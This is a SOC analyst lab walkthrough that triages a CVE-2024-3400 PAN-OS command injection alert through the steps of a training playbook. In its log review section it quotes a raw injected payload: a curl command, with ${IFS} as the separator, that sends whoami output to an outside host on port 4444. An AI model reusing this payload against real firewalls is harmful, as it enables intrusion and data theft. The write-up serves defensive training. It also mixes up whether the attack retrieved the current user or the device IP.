# ‚≠ê SOC274 - Palo Alto Networks PAN-OS Command Injection Vulnerability Exploitation (CVE-2024-3400)  

## Overview  

![Overview](https://github.com/user-attachments/assets/c4a00a9d-38ff-419d-97cf-f7e4d4f2fc3f)  

This investigation addresses the **SOC274 - Palo Alto Networks PAN-OS Command Injection Vulnerability Exploitation** alert, categorized as **Critical**. Immediate and thorough investigation is necessary to assess the impact and contain the threat.  

---

## Investigation Steps  

### 1. **Creating a Case**  
To begin the investigation, create a case by selecting the **"Create Case"** button on the investigation page.  
![Create Case](https://github.com/user-attachments/assets/c39c9701-5f0c-434e-946c-8443564513e7)  

Once created, the case is opened in **Case Management**, where the investigation will follow the provided **playbook**. Click on **"Start Playbook"** to proceed.  
![Playbook Start](https://github.com/user-attachments/assets/62206a5d-887b-4a6b-aaf4-3f462debb579)  

---

### 2. **Understanding the Alert**  
The alert was triggered when a **POST method request** was sent to the firewall. The **session cookie** within the request contained the **`whoami` command**, used to retrieve the **current user** on the firewall. This command injection within the session cookie is the source of the alert.  
![Alert Triggered](https://github.com/user-attachments/assets/51ae009f-d36b-45f6-b5bd-8ca4a4c1e033)  

---

### 3. **Collecting Key Data**  
The playbook requires answers to several key questions:  
- **If traffic originated from the Internet:**  
  - **Ownership of the IP address** (Static, Pool Address, Web Hosting, etc.)  
  - **IP Reputation** (Check via **VirusTotal**, **AbuseIPDB**, **Cisco Talos**)  
- **If traffic originated from the company network:**  
  - **Hostname** of the source device  
  - **Owner (Username)** of the device  
  - **Last Logon Time**  

Collect and document these answers before moving to the next step.  
![Collect Data](https://github.com/user-attachments/assets/2d472466-674e-424f-b1d4-b50ece83dfcc)  

---

### 4. **Reviewing HTTP Traffic**  
Open **endpoint security** tools and **log management** to examine **HTTP traffic**. After reviewing raw logs, two suspicious entries were identified containing commands sent to the firewall.  

**Logs:**  
2024-04-18 15:09:42,629: dt_send INFO TX_DIR: send file dir: fname: /opt/panlogs/tmp/device_telemetry/day/aaacurl${IFS}144.172.79.92:4444?user=`$(whoami)`
2024-04-18 15:09:42,629 : dt_send INFO TX FILE: send_fname: /opt/panlogs/tmp/device_telemetry/day/aaacurl${IFS}144.172.79.92:4444?user=`$(whoami)`
2024-04-18 15:09:42,630: dt_send INFO TX_FILE: dest server ip: 144.172.79.92
2024-04-18 15:09:42,630 : dt_send INFO TX FILE: send_file_cmd: /usr/local/bin/dt_curl -i 172.16.17.139 -f /opt/panlogs/tmp/device_telemetry/day/aaacurl${IFS}144.172.79.92:4444?user=`$(whoami)`


This traffic confirms **command injection** from an external IP address (**144.172.79.92**) using the **`whoami`** command to retrieve user information.  
![Raw Logs](https://github.com/user-attachments/assets/11b5d1f9-f693-4109-8642-f7024f6e829f)  

---

### 5. **Determining Maliciousness**  
Based on the logs, the **traffic is confirmed as malicious**. Select **"Malicious"** in the playbook to proceed.  
![Malicious Traffic](https://github.com/user-attachments/assets/678e9ca5-fd44-4b0b-b940-9d60540ff6ea)  

---

### 6. **Identifying Attack Type**  
The next step is to identify the attack type. In this case, it is **Command Injection**. Select **"Command Injection"** to continue.  
![Attack Type](https://github.com/user-attachments/assets/783cc046-940e-4a57-b1a5-c5344e0931ec)  

---

### 7. **Checking for Attack Simulation Products**  
If the traffic was generated by **attack simulation tools** (e.g., Verodin, AttackIQ, Picus), it might be a planned test. However, no evidence of such products was found. Therefore, select **"Not Planned"** to proceed.  

---

### 8. **Traffic Direction**  
The direction of traffic is identified as **Internet to Company Network**. The **destination** is the **PA-Firewall device** (internal network), and the **source** is a **public IP address**.  
![Direction of Traffic](https://github.com/user-attachments/assets/60f1ce0e-f7cf-4a5b-9781-bb0dc9ac9318)  

---

### 9. **Checking Command Execution**  
Review the **command history** in the **endpoint security** system to confirm if the malicious command was executed. The logs confirm that the **PA-Firewall IP address** was successfully retrieved using the injected command.  

This confirms the **attack was successful**.  
![Successful Attack](https://github.com/user-attachments/assets/f06dfd5c-2337-4850-88b5-5573622be88f)  

---

### 10. **Requesting Containment**  
Since the attack was successful, the affected system must be **contained** to prevent further compromise. Click **"Request and Change to Contain"** to proceed.  
![Containment](https://github.com/user-attachments/assets/dbd05743-4506-400d-9027-2817f7b24744)  

---

### 11. **Submitting Artifacts**  
Enter all **artifacts** (e.g., IP addresses, session cookies) identified during the investigation in the playbook.  
![Artifacts](https://github.com/user-attachments/assets/ec72a8be-ec46-4dd5-920a-1300acc22182)  

---

### 12. **Escalating to Tier 2**  
Due to the **successful attack** and sensitive nature of the target, escalate the case to **Tier 2** for further analysis.  
![Escalate to Tier 2](https://github.com/user-attachments/assets/2a6d418b-e084-4dae-8600-100e90351e0d)  

---

### 13. **Finalizing the Playbook**  
Document the investigation findings:  
- **Confirmed true positive**: The attack was successful.  
- **Command injection** was used to retrieve the IP address of the PA-Firewall.  
- **System containment** was requested, and the case was **escalated to Tier 2**.  

Click **"Finish Playbook"** to complete the investigation.  
![Finish Playbook](https://github.com/user-attachments/assets/2a6d418b-e084-4dae-8600-100e90351e0d)  

Finally, close the alert by selecting **"True Positive"**.  
![Close Alert](https://github.com/user-attachments/assets/3a7ccc17-fdb0-44ae-87a2-5ee65deed912)  

---

## Conclusion  

This investigation confirms that the alert is a **true positive**. The **command injection attack** successfully retrieved the **current IP address** of the PA-Firewall. The system has been **contained** to prevent further exploitation, and the case has been **escalated to Tier 2** for advanced analysis.  

Stay vigilant and proactive in your security efforts!
